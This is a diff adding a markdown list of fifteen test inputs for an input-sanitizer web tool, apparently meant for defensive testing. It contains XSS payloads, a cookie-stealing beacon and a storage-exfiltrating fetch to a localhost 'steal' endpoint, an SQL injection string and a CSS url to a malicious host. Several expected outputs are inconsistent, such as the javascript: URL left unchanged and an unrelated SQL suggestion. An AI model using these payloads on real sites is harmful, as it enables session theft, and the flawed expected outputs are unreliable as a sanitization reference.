@@ -1,0 +1,213 @@
+# Examples of Input for the Input Sanitizer Web Tool
+
+## Example 1: Script Injection
+
+    Input:
+        <script>alert('This is an attack!');</script>
+
+    expected Sanitized Output:
+
+
+..:: Suggestions:
+
+    - Avoid using <script> tags in your input.
+----------------------------------------------------------------------------------------
+
+## Example 2: Inline Event Handler
+
+    Input:
+        <div onclick="alert('Hacked!')">Click me</div>
+
+    Expected Sanitized Output:
+        <div>Click me</div>
+
+..:: Suggestions:
+
+    - Avoid using inline event handlers like onclick, onerror, etc.
+----------------------------------------------------------------------------------------
+
+## Example 3: JavaScript URL
+
+    Input:
+        <a href="javascript:alert('Phishing!')">Click here</a>
+
+    Expected Sanitized Output:
+        <a href="javascript:alert('Phishing!')">Click here</a>
+
+..:: Suggestions:
+
+    - Avoid using javascript: URLs in your input.
+----------------------------------------------------------------------------------------
+
+## Example 4: Safe Input
+
+    Input:
+        <p>This is a safe paragraph.</p>
+
+    Expected Sanitized Output:
+        <p>This is a safe paragraph.</p>
+
+..:: Suggestions:
+
+    - No issues detected.
+----------------------------------------------------------------------------------------
+
+## Example 5: Mixed Content
+    Input:
+        <div onmouseover="alert('Danger!')"><script>alert('Attack!');</script>Safe content</div>
+
+    Expected Sanitized Output:
+        <div>Safe content</div>
+
+..:: Suggestions:
+
+    - Avoid using <script> tags in your input.
+    - Avoid using inline event handlers like onclick, onerror, etc.
+----------------------------------------------------------------------------------------
+
+## Example 6: Image with Malicious Attributes
+
+    Input:
+        <img src="x" onerror="alert('XSS Attack!')">
+
+    Expected Sanitized Output:
+        <img src="x">
+
+..:: Suggestions:
+
+    - Avoid using inline event handlers like onclick, onerror, etc.
+    - Use parameterized queries to prevent SQL injection.
+----------------------------------------------------------------------------------------
+
+## Example 7: DOM Manipulation via JavaScript
+
+    Input:
+        document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
+
+    Expected Sanitized Output:
+        document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
+
+..:: Suggestions:
+
+    - This input is not sanitized. Avoid directly manipulating the DOM with untrusted input.
+----------------------------------------------------------------------------------------
+
+## Example 8: Redirecting Page
+    Input:
+        <a href="https://www.youtube.com/" target="_blank">Click here</a>
+
+    Expected Sanitized Output:
+        <a href="https://www.youtube.com/" target="_blank">Click here</a>
+
+..:: Suggestions:
+
+    - No issues detected.
+----------------------------------------------------------------------------------------
+
+## Example 9: Stealing Cookies
+
+    Input:
+        const img = document.createElement('img'); img.src = 'http://localhost:3000/steal?session=' + document.cookie; document.body.appendChild(img);
+
+    Expected Sanitized Output:
+        const img = document.createElement('img'); img.src = 'http://localhost:3000/steal?session=' + document.cookie; document.body.appendChild(img);
+
+..:: Suggestions:
+
+    - This input is not sanitized. Avoid executing untrusted JavaScript that accesses sensitive data.
+----------------------------------------------------------------------------------------
+
+## Example 10: Stealing LocalStorage and SessionStorage
+
+    Input:
+        const data = {
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage)
+        };
+        fetch('http://localhost:3000/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+    Expected Sanitized Output:
+        const data = {
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage)
+        };
+        fetch('http://localhost:3000/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+..:: Suggestions:
+
+    - This input is not sanitized. Avoid executing untrusted JavaScript that accesses sensitive data.
+----------------------------------------------------------------------------------------
+
+## Example 11: SQL Injection in Input Fields
+
+    Input:
+        username=admin' OR '1'='1'; --
+
+    Expected Sanitized Output:
+        username=admin' OR '1'='1'; --
+
+..:: Suggestions:
+
+    - This input is not sanitized. Use parameterized queries to prevent SQL injection.
+----------------------------------------------------------------------------------------
+
+## Example 12: Cross-Site Scripting in Form Fields
+
+    Input:
+        <input type="text" value="<script>alert('XSS')</script>">
+
+    Expected Sanitized Output:
+        <input type="text" value="">
+
+..:: Suggestions:
+
+    - Avoid using <script> tags in your input.
+----------------------------------------------------------------------------------------
+
+## Example 13: Malicious CSS Injection
+
+    Input:
+        <style>body { background: url('http://malicious-site.com/steal.png'); }</style>
+
+    Expected Sanitized Output:
+        <style>body { background: url('http://malicious-site.com/steal.png'); }</style>
+
+..:: Suggestions:
+
+    - This input is not sanitized. Avoid embedding untrusted CSS.
+----------------------------------------------------------------------------------------
+
+## Example 14: Dangerous Inline Styles
+
+    Input:
+        <div style="background-image: url('javascript:alert(1)')">Test</div>
+
+    Expected Sanitized Output:
+        <div style="background-image: url('#alert(1)')">Test</div>
+
+..:: Suggestions:
+
+    - Avoid using javascript: URLs in your input.
+    - Avoid using dangerous inline styles.
+----------------------------------------------------------------------------------------
+
+## Example 15: Hidden Malicious Content
+
+    Input:
+        <div style="display:none">Hidden attack</div>
+
+    Expected Sanitized Output:
+        <div>Hidden attack</div>
+
+..:: Suggestions:
+
+    - Avoid using styles that hide malicious content.
+----------------------------------------------------------------------------------------
